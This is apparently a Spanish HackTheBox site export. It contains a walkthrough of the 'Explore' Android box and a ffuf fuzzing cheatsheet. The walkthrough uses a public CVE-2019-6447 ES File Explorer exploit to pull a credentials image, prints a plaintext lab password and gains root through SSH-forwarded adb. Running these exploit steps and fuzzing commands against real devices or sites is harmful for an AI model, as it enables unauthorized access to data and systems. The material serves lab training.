SF:enericLines,AA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x20 SF:28\\x20Jul\\x202021\\x2020:20:01\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\ SF:r\\nInvalid\\x20request\\x20line:\\x20\")%r(GetRequest,5C,\"HTTP/1\\.1\\x20412\\ SF:x20Precondition\\x20Failed\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2020:2 SF:0:01\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(HTTPOptions,B5,\"HTTP/1\\ SF:.0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x202021\\x SF:2020:20:06\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/pla SF:in;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x2 SF:0supported:\\x20OPTIONS\")%r(RTSPRequest,BB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20R SF:equest\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2020:20:06\\x20GMT\\r\\nCont SF:ent-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r SF:\\nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version: SF:\\x20\\x20RTSP/1\\.0\")%r(Help,AE,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDa SF:te:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2020:20:22\\x20GMT\\r\\nContent-Length:\\ SF:x2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection SF::\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\")%r(SSLSessionReq SF:,DD,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x SF:202021\\x2020:20:22\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\ SF:x20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\? SF:\\0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?<=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\")%r(TLSSession SF:Req,DB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x2028\\x20Ju SF:l\\x202021\\x2020:20:22\\x20GMT\\r\\nContent-Length:\\x2071\\r\\nContent-Type:\\ SF:x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInval SF:id\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\0e\\x03\\x03U\\x1c\\?\\?random SF:1random2random3random4\\0\\0\\x0c\\0/\\0\")%r(Kerberos,BD,\"HTTP/1\\.0\\x20400\\x SF:20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2020:20:22\\x20G SF:MT\\r\\nContent-Length:\\x2041\\r\\nContent-Type:\\x20text/plain;\\x20charset= SF:US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20 SF:\\0\\0\\0qj\\?n0\\?k\\?\\x03\\x02\\x01\\x05\\?\\x03\\x02\\x01\"); User Own El puerto mas interesante que encontramos es el 33083 , aunque nmap lo identifica como un servicio de api para un server de minecraft, lo cierto es que en Android lo utiliza la aplicacion ES FILE EXPLORER para montar un servidor web al que se puede acceder si estas dentro de la misma red. Author: Elliot Alderson Vuln: CVE-2019-6447 p0c: https://github.com/fs0c131y/ESFileExplorerOpenPortVuln En este caso voy a utilizar un exploit funcional que podemos encontrar con searchsploit [root@htb explore]# searchsploit es file explorer file read -------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------- --------------------------------- ES File Explorer 4.1.9.7.4 - Arbitrary File Read | android/remote/50070.py -------------------------------------------------------------------------------- --------------------------------- Un vistazo al exploit nos muestra los comandos disponibles print(\"Available commands : \") print(\" listFiles : List all Files.\") print(\" listPics : List all Pictures.\") print(\" listVideos : List all videos.\") print(\" listAudios : List all audios.\") print(\" listApps : List Applications installed.\") print(\" listAppsSystem : List System apps.\") print(\" listAppsPhone : List Communication related apps.\") print(\" listAppsSdcard : List apps on the SDCard.\") print(\" listAppsAll : List all Application.\") print(\" getFile : Download a file.\") print(\" getDeviceInfo : Get device info.\") Tras un rato jugando con las rutas y entendiendo el alcance del exploit, me encuentro con un archivo interesante [root@htb explore]# python3 50070.py listPics explore.htb ================================================================== | ES File Explorer Open Port Vulnerability : CVE-2019-6447 | | Coded By : Nehal a.k.a PwnerSec | ================================================================== name : concept.jpg time : 4/21/21 02:38:08 AM location : /storage/emulated/0/DCIM/concept.jpg size : 135.33 KB (138,573 Bytes) name : anc.png time : 4/21/21 02:37:50 AM location : /storage/emulated/0/DCIM/anc.png size : 6.24 KB (6,392 Bytes) name : creds.jpg time : 4/21/21 02:38:18 AM location : /storage/emulated/0/DCIM/creds.jpg size : 1.14 MB (1,200,401 Bytes) name : 224_anc.png time : 4/21/21 02:37:21 AM location : /storage/emulated/0/DCIM/224_anc.png size : 124.88 KB (127,876 Bytes) [root@htb explore]# python3 50070.py getFile explore.htb /storage/emulated/0/DCIM/creds.jpg ================================================================== | ES File Explorer Open Port Vulnerability : CVE-2019-6447 | | Coded By : Nehal a.k.a PwnerSec | ================================================================== [+] Downloading file... [+] Done. Saved as `out.dat`. [root@htb explore]# mv out.dat creds.jpg kristi Kr1sT!5h@Rp3xPl0r3! Con estos datos podemos acceder por ssh y ver la flag user.txt [root@htb explore]# ssh -p 2222 -l kristi explore.htb Password authentication Password: :/ $ cat sdcard/user.txt f32017174c7c7e8f********* :/ $ Root Own Para conectarnos como root a un dispositivo Android, normalmente usamos adb mientras mantenemos conectado el dispositivo por usb, siempre y cuando tengamos habilitada la depuracion USB. Android Debug Bridge (adb) Tal y como se explica en el articulo anterior, adb necesita un servidor en ejecucion para establecer la conexion con el emulador en un puerto entre 5555-5585. Sabiendo esto vamos a analizar los puertos a la escucha. [root@htb explore]# ssh -p 2222 -l kristi explore.htb Password authentication Password: :/ $ netstat -natpe |grep -i listen tcp6 0 0 ::ffff:127.0.0.1:34131 :::* LISTEN 10077 3174975 - tcp6 0 0 :::5555 :::* LISTEN 2000 7568 - tcp6 0 0 :::42135 :::* LISTEN 10077 3174581 - tcp6 0 0 :::59777 :::* LISTEN 10077 3173587 - tcp6 0 0 ::ffff:10.10.10.2:41953 :::* LISTEN 10077 3173217 - tcp6 0 0 :::2222 :::* LISTEN 10076 39360 3659/net.xnano.android.sshserver :/ $ perfecto, tenemos a la escucha el puerto 5555 pero no tenemos acceso por USB.. Una solucion para establecer la conexion con adb consiste en establecer un puente a traves del ssh, nateando el puerto 5555 a nuestra maquina local y enviando un adb hacia ese puerto. Un articulo que lo explica con sencillez es el siguiente : Port forwarding over SSH to an Android Thing(s) Para realizar esta tarea manualmente hariamos lo siguiente abriendo dos terminales : Terminal01 ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247 Terminal02 adb connect localhost:5555 adb shell su Root Flag Location : /data/root.txt EXTRA : Como me habia sabido a poco la explotacion del usuario root, he hecho un script que automatiza el proceso haciendo uso de expect y no requiere interaccion humana Descarga : autoexploit.sh [root@htb explore]# ./autoexploit.sh spawn /usr/bin/adb connect localhost:5555 spawn /usr/bin/adb shell x86_64:/ $ su :/ # ls -alt /data/root.txt -rw------- 1 root root 33 2021-03-13 18:31 /data/root.txt","title":"Explore"},{"location":"machines/explore/#description","text":"Esta es una maquina diferente, emula un dispositivo android que expone un servicio vulnerable y un \"tricky\" para conectarnos a ella con la suite adb. Es una maquina divertida que nos acerca a un entorno que no solemos ver en la plataforma hack the box.","title":" Description"},{"location":"machines/explore/#enumeration","text":"Para la enumeracion basica vamos a utilizar una tool que he desarrollado especificamente para trabajar con maquinas en la plataforma hackthebox. Esta herramienta crea la carpeta de trabajo, realiza un escaneo basico con nmap y si encuentra un servicio web le lanza una enumeracion basica. Descarga: HTBenum Nmap Nmap scan report for explore.htb (10.10.10.247) Host is up (0.077s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 33083/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:01 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Wed, 28 Jul 2021 20:20:01 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Wed, 28 Jul 2021 20:20:06 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:22 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | Kerberos: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:22 GMT | Content-Length: 41 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | qj?n0?k? | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:06 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:22 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????<=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Wed, 28 Jul 2021 20:20:22 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ ??random1random2random3random4 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn't have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.70%I=7%D=7/28%Time=6101BA26%P=x86_64-pc-linux-gnu%r(NU SF:LL,24,\"SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port33083-TCP:V=7.70%I=7%D=7/28%Time=6101BA25%P=x86_64-pc-linux-gnu%r(G SF:enericLines,AA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x20 SF:28\\x20Jul\\x202021\\x2020:20:01\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\ SF:r\\nInvalid\\x20request\\x20line:\\x20\")%r(GetRequest,5C,\"HTTP/1\\.1\\x20412\\ SF:x20Precondition\\x20Failed\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2020:2 SF:0:01\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(HTTPOptions,B5,\"HTTP/1\\ SF:.0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x202021\\x SF:2020:20:06\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/pla SF:in;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x2 SF:0supported:\\x20OPTIONS\")%r(RTSPRequest,BB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20R SF:equest\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2020:20:06\\x20GMT\\r\\nCont SF:ent-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r SF:\\nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version: SF:\\x20\\x20RTSP/1\\.0\")%r(Help,AE,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDa SF:te:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2020:20:22\\x20GMT\\r\\nContent-Length:\\ SF:x2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection SF::\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\")%r(SSLSessionReq SF:,DD,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x SF:202021\\x2020:20:22\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\ SF:x20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\? SF:\\0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?<=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\")%r(TLSSession SF:Req,DB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x2028\\x20Ju SF:l\\x202021\\x2020:20:22\\x20GMT\\r\\nContent-Length:\\x2071\\r\\nContent-Type:\\ SF:x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInval SF:id\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\0e\\x03\\x03U\\x1c\\?\\?random SF:1random2random3random4\\0\\0\\x0c\\0/\\0\")%r(Kerberos,BD,\"HTTP/1\\.0\\x20400\\x SF:20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2020:20:22\\x20G SF:MT\\r\\nContent-Length:\\x2041\\r\\nContent-Type:\\x20text/plain;\\x20charset= SF:US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20 SF:\\0\\0\\0qj\\?n0\\?k\\?\\x03\\x02\\x01\\x05\\?\\x03\\x02\\x01\");","title":" Enumeration"},{"location":"machines/explore/#user-own","text":"El puerto mas interesante que encontramos es el 33083 , aunque nmap lo identifica como un servicio de api para un server de minecraft, lo cierto es que en Android lo utiliza la aplicacion ES FILE EXPLORER para montar un servidor web al que se puede acceder si estas dentro de la misma red. Author: Elliot Alderson Vuln: CVE-2019-6447 p0c: https://github.com/fs0c131y/ESFileExplorerOpenPortVuln En este caso voy a utilizar un exploit funcional que podemos encontrar con searchsploit [root@htb explore]# searchsploit es file explorer file read -------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------- --------------------------------- ES File Explorer 4.1.9.7.4 - Arbitrary File Read | android/remote/50070.py -------------------------------------------------------------------------------- --------------------------------- Un vistazo al exploit nos muestra los comandos disponibles print(\"Available commands : \") print(\" listFiles : List all Files.\") print(\" listPics : List all Pictures.\") print(\" listVideos : List all videos.\") print(\" listAudios : List all audios.\") print(\" listApps : List Applications installed.\") print(\" listAppsSystem : List System apps.\") print(\" listAppsPhone : List Communication related apps.\") print(\" listAppsSdcard : List apps on the SDCard.\") print(\" listAppsAll : List all Application.\") print(\" getFile : Download a file.\") print(\" getDeviceInfo : Get device info.\") Tras un rato jugando con las rutas y entendiendo el alcance del exploit, me encuentro con un archivo interesante [root@htb explore]# python3 50070.py listPics explore.htb ================================================================== | ES File Explorer Open Port Vulnerability : CVE-2019-6447 | | Coded By : Nehal a.k.a PwnerSec | ================================================================== name : concept.jpg time : 4/21/21 02:38:08 AM location : /storage/emulated/0/DCIM/concept.jpg size : 135.33 KB (138,573 Bytes) name : anc.png time : 4/21/21 02:37:50 AM location : /storage/emulated/0/DCIM/anc.png size : 6.24 KB (6,392 Bytes) name : creds.jpg time : 4/21/21 02:38:18 AM location : /storage/emulated/0/DCIM/creds.jpg size : 1.14 MB (1,200,401 Bytes) name : 224_anc.png time : 4/21/21 02:37:21 AM location : /storage/emulated/0/DCIM/224_anc.png size : 124.88 KB (127,876 Bytes) [root@htb explore]# python3 50070.py getFile explore.htb /storage/emulated/0/DCIM/creds.jpg ================================================================== | ES File Explorer Open Port Vulnerability : CVE-2019-6447 | | Coded By : Nehal a.k.a PwnerSec | ================================================================== [+] Downloading file... [+] Done. Saved as `out.dat`. [root@htb explore]# mv out.dat creds.jpg kristi Kr1sT!5h@Rp3xPl0r3! Con estos datos podemos acceder por ssh y ver la flag user.txt [root@htb explore]# ssh -p 2222 -l kristi explore.htb Password authentication Password: :/ $ cat sdcard/user.txt f32017174c7c7e8f********* :/ $","title":" User Own"},{"location":"machines/explore/#root-own","text":"Para conectarnos como root a un dispositivo Android, normalmente usamos adb mientras mantenemos conectado el dispositivo por usb, siempre y cuando tengamos habilitada la depuracion USB. Android Debug Bridge (adb) Tal y como se explica en el articulo anterior, adb necesita un servidor en ejecucion para establecer la conexion con el emulador en un puerto entre 5555-5585. Sabiendo esto vamos a analizar los puertos a la escucha. [root@htb explore]# ssh -p 2222 -l kristi explore.htb Password authentication Password: :/ $ netstat -natpe |grep -i listen tcp6 0 0 ::ffff:127.0.0.1:34131 :::* LISTEN 10077 3174975 - tcp6 0 0 :::5555 :::* LISTEN 2000 7568 - tcp6 0 0 :::42135 :::* LISTEN 10077 3174581 - tcp6 0 0 :::59777 :::* LISTEN 10077 3173587 - tcp6 0 0 ::ffff:10.10.10.2:41953 :::* LISTEN 10077 3173217 - tcp6 0 0 :::2222 :::* LISTEN 10076 39360 3659/net.xnano.android.sshserver :/ $ perfecto, tenemos a la escucha el puerto 5555 pero no tenemos acceso por USB.. Una solucion para establecer la conexion con adb consiste en establecer un puente a traves del ssh, nateando el puerto 5555 a nuestra maquina local y enviando un adb hacia ese puerto. Un articulo que lo explica con sencillez es el siguiente : Port forwarding over SSH to an Android Thing(s) Para realizar esta tarea manualmente hariamos lo siguiente abriendo dos terminales : Terminal01 ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247 Terminal02 adb connect localhost:5555 adb shell su Root Flag Location : /data/root.txt EXTRA : Como me habia sabido a poco la explotacion del usuario root, he hecho un script que automatiza el proceso haciendo uso de expect y no requiere interaccion humana Descarga : autoexploit.sh [root@htb explore]# ./autoexploit.sh spawn /usr/bin/adb connect localhost:5555 spawn /usr/bin/adb shell x86_64:/ $ su :/ # ls -alt /data/root.txt -rw------- 1 root root 33 2021-03-13 18:31 /data/root.txt","title":" Root Own"},{"location":"tools/ffuf/","text":".md-typeset h1, .md-content__button { display: none; } Fuzz Faster u Fool FFUF o \"Fuzz Faster you Fool\" es una herramienta opensource creada para realizar descubrimiento y contenido dentro de aplicaciones web. Es similar a otras herramientas como wfuzz o dirsearch con la ventaja de que esta dise\u00f1ada para ser mas rapida y flexible en su ejecucion. Instalacion Para poder instalar ffuf necesitamos disponer de go en nuestro SO. Instalacion de go en debian # A\u00f1adimos las siguientes lineas al final ~/.bashrc export GOPATH=/home/git/go export GOROOT=/usr/local/src/go export PATH=${PATH}:$GOROOT/bin:/home/git/go/bin # Ejecutamos las siguientes instrucciones $ source ~/.bashrc $ wget $(curl -s https://golang.org/dl/ |grep --color=never -i linux-amd64.tar.gz |head -n1|awk '{print $4}'|sed 's#href=\"#https://golang.org#g'|sed 's#\">##g') $ tar zxf go*.linux-amd64.tar.gz $ mv go $GOROOT $ rm -rf go*.linux-amd64.tar.gz* $ go version El metodo recomendado de instalacion es a traves de go go get github.com/ffuf/ffuf Actualizaciones desde el source go get -u github.com/ffuf/ffuf Antes de utilizar cualquier herramienta de fuzzing necesitamos descargar diccionarios de palabras. Una muy buena coleccion para este proposito es SecList cd /opt && git clone https://github.com/danielmiessler/SecLists.git Cheatsheet Directorios ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost/FUZZ Extensiones ffuf -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://localhost/indexFUZZ Palabra + Extension conocida ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost/FUZZ.php Recursividad con extension ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost/FUZZ -recursion -recursion-depth 1 -e .php -v Subdominios ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.google.com/ Vhosts (probablemente habra que a\u00f1adir un filtro con -fs ) ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://domain.com/ -H 'Host: FUZZ.domain.com' KeyParameter (probablemente habra que a\u00f1adir un filtro con -fs ) ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://localhost/admin.php?FUZZ=key ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://localhost/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' idValue (probablemente habra que a\u00f1adir un filtro con -fs ) for i in $(seq 1 10000);do echo $i >> ids.txt;done ffuf -w ids.txt:FUZZ -u http://localhost/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' Useful Command ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml','.py','.log','.json','.old' -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost/FUZZ Guias Everything you need to know about FFUF A ffuf Primer Comprehensive Guide on ffuf \u00b7 PDF","title":"FFUF"},{"location":"tools/ffuf/#fuzz-faster-u-fool","text":"FFUF o \"Fuzz Faster you Fool\" es una herramienta opensource creada para realizar descubrimiento y contenido dentro de aplicaciones web. Es similar a otras herramientas como wfuzz o dirsearch con la ventaja de que esta dise\u00f1ada para ser mas rapida y flexible en su ejecucion.","title":"Fuzz Faster u Fool   "},{"location":"tools/ffuf/#instalacion","text":"Para poder instalar ffuf necesitamos disponer de go en nuestro SO. Instalacion de go en debian # A\u00f1adimos las siguientes lineas al final ~/.bashrc export GOPATH=/home/git/go export GOROOT=/usr/local/src/go export PATH=${PATH}:$GOROOT/bin:/home/git/go/bin # Ejecutamos las siguientes instrucciones $ source ~/.bashrc $ wget $(curl -s https://golang.org/dl/ |grep --color=never -i linux-amd64.tar.gz |head -n1|awk '{print $4}'|sed 's#href=\"#https://golang.org#g'|sed 's#\">##g') $ tar zxf go*.linux-amd64.tar.gz $ mv go $GOROOT $ rm -rf go*.linux-amd64.tar.gz* $ go version El metodo recomendado de instalacion es a traves de go go get github.com/ffuf/ffuf Actualizaciones desde el source go get -u github.com/ffuf/ffuf Antes de utilizar cualquier herramienta de fuzzing necesitamos descargar diccionarios de palabras. Una muy buena coleccion para este proposito es SecList cd /opt && git clone https://github.com/danielmiessler/SecLists.git","title":" Instalacion"},{"location":"tools/ffuf/#cheatsheet","text":"Directorios ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost/FUZZ Extensiones ffuf -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://localhost/indexFUZZ Palabra + Extension conocida ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost/FUZZ.php Recursividad con extension ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost/FUZZ -recursion -recursion-depth 1 -e .php -v Subdominios ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.google.com/ Vhosts (probablemente habra que a\u00f1adir un filtro con -fs ) ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://domain.com/ -H 'Host: FUZZ.domain.com' KeyParameter (probablemente habra que a\u00f1adir un filtro con -fs ) ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://localhost/admin.php?FUZZ=key ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://localhost/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' idValue (probablemente habra que a\u00f1adir un filtro con -fs ) for i in $(seq 1 10000);do echo $i >> ids.txt;done ffuf -w ids.txt:FUZZ -u http://localhost/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' Useful Command ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml','.py','.log','.json','.old' -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost/FUZZ","title":" Cheatsheet"},{"location":"tools/ffuf/#guias","text":"Everything you need to know about FFUF A ffuf Primer Comprehensive Guide on ffuf \u00b7 PDF","title":" Guias"},{"location":"tools/htbenum/","text":".md-typeset h1, .md-content__button { display: none; } Enumeration Script Esta herramienta nos ayudara a realizar una enumeracion basica contra una maquina de HackTheBox. Las funciones que realiza son las siguientes: checkvpn Comprueba si la VPN se encuentra activa checkping Comprueba que podemos hacer ping al objetivo createfolder Crea el directorio de trabajo addhost A\u00f1ade el nombre la maquina y su ip a /etc/hosts scan Realiza un escaneo con Nmap webinfo Si detecta el puerto 80 o 443 lanza whatweb y curl -I HTBenum.sh #!/bin/bash # HTB Enumeration Script # LoRKa command -v nmap >/dev/null 2 > & 1 || { echo -e > & 2 \"[\\e[1;31m!\\e[0m] You need \\e[1;32mnmap\\e[0m , please install it.\" ; exit 1 ; } command -v whatweb >/dev/null 2 > & 1 || { echo -e > & 2 \"[\\e[1;31m!\\e[0m] You need \\e[1;32mwhatweb\\e[0m , please install it.\" ; exit 1 ; } command -v curl >/dev/null 2 > & 1 || { echo -e > & 2 \"[\\e[1;31m!\\e[0m] You need \\e[1;32mcurl\\e[0m , please install it.\" ; exit 1 ; } if [ \" $# \" -ne \"2\" ] || [ \" $# \" -gt \"2\" ] ; then echo \"[+] Use: $( basename $0 ) machineNAME machineIP\" echo \"[+] Exp: $( basename $0 ) Armageddon 10.10.10.233\" exit -1 fi trap '/bin/rm -rf \"$TMPFILE\"' EXIT #Vars NAME = \" $1 \" IP = \" $2 \" TMPFILE = $( mktemp ) FOLDER = \"/hackthebox/ $NAME \" #Functions checkvpn (){ ip -4 a show tun0 1 >/dev/null 2 >/dev/null if [ $? -ne 0 ] ; then printf '%s\\n' \"[!] ERROR: la VPN no esta conectada :(\" exit -1 fi } checkping (){ timeout 0 .3 ping -c1 $IP 1 >/dev/null 2 >/dev/null if [ $? -ne 0 ] ; then printf '%s\\n' \"[!] ERROR: la ip $IP no contesta a ping :(\" exit -1 fi } createfolder (){ if [ -d \" $FOLDER \" ] ; then printf '%s\\n' \"[!] Cuidado! el directorio $FOLDER existe!\" exit -1 fi mkdir -p $FOLDER } addhost (){ local HOSTSFILE = \"/etc/hosts\" local HOSTNAME = \" $NAME .htb\" local IP = \" $IP \" local LINE = \" $IP \\t $HOSTNAME \" if [ -n \" $( grep $HOSTNAME $HOSTSFILE ) \" ] then printf '%s\\n' \"[!] $HOSTNAME ya existe en $HOSTSFILE : $( grep $HOSTNAME $HOSTSFILE ) \" else sh -c -e \"echo ' $LINE ' >> $HOSTSFILE \" ; if [ -n \" $( grep $HOSTNAME $HOSTSFILE ) \" ] then : else printf '%s\\n' \"[+] Error al agregar $HOSTNAME , prueba de nuevo!\" ; fi fi } scan (){ /usr/bin/nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG $TMPFILE $IP local PORTS = $( /bin/cat $TMPFILE | grep -oP '\\d{1,5}/open' | awk '{print $1}' FS = '/' | xargs | tr ' ' ',' ) /usr/bin/nmap -sC -sV -p $PORTS -oN $FOLDER /nmap.txt $IP } webinfo (){ local OUTPUT = \" $FOLDER /webinfo.txt\" if cat $TMPFILE | grep -oP '\\d{1,5}/open' | awk '{print $1}' FS = '/' | grep -w '80' ; then whatweb http:// $NAME .htb >> $OUTPUT echo \"\" >> $OUTPUT curl -s -I -X GET http:// $NAME .htb >> $OUTPUT elif cat $TMPFILE | grep -oP '\\d{1,5}/open' | awk '{print $1}' FS = '/' | grep -w '443' ; then whatweb https:// $NAME .htb >> $OUTPUT echo \"\" >> $OUTPUT curl -s -k -I -X GET https:// $NAME .htb >> $OUTPUT fi } #RunAway checkvpn checkping createfolder addhost scan webinfo","title":"HTBenum"},{"location":"tools/htbenum/#enumeration-script","text":"Esta herramienta nos ayudara a realizar una enumeracion basica contra una maquina de HackTheBox. Las funciones que realiza son las siguientes: checkvpn Comprueba si la VPN se encuentra activa checkping Comprueba que podemos hacer ping al objetivo createfolder Crea el directorio de trabajo addhost A\u00f1ade el nombre la maquina y su ip a /etc/hosts scan Realiza un escaneo con Nmap webinfo Si detecta el puerto 80 o 443 lanza 